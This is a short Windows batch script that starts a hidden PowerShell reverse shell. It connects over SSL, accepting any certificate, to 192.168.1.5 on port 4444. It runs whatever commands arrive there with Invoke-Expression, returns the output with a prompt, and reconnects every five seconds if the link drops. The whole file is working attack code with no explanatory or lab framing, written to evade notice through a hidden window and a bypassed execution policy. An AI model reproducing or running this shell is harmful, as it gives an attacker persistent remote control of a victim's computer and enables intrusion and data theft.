@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
$ErrorActionPreference = 'Stop';
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient('192.168.1.5', 4444);
        $sslStream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
        $sslStream.AuthenticateAsClient('192.168.100.131');
        [byte[]]$bytes = 0..65535|%{0};
        while (($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
            $sendback = (iex $data 2>&1 | Out-String);
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
            $sslStream.Write($sendbyte, 0, $sendbyte.Length);
            $sslStream.Flush();
        }
        $client.Close();
    } catch {
        Start-Sleep -Seconds 5;
    }
}
"
